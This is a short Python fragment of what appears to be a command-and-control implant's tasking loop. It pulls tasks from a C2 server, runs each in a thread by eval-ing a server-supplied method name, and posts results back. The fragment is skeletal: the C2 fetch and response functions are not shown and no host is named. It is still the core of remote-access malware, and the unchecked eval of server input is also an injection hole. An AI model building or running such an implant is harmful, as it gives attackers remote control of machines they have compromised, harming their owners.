def getTaskings(self):
    self.taskings = fetch_tasks_from_c2()

def processTaskings(self):
    for task in self.taskings:
        if not task['started']:
            thread = threading.Thread(target=self.execute_task, args=(task,))
            thread.start()

def execute_task(self, task):
    command = task['command']
    params = task['parameters']
    result = eval('self.' + command)(*params)
    task['result'] = result
    task['completed'] = True
    self.postResponses(task)

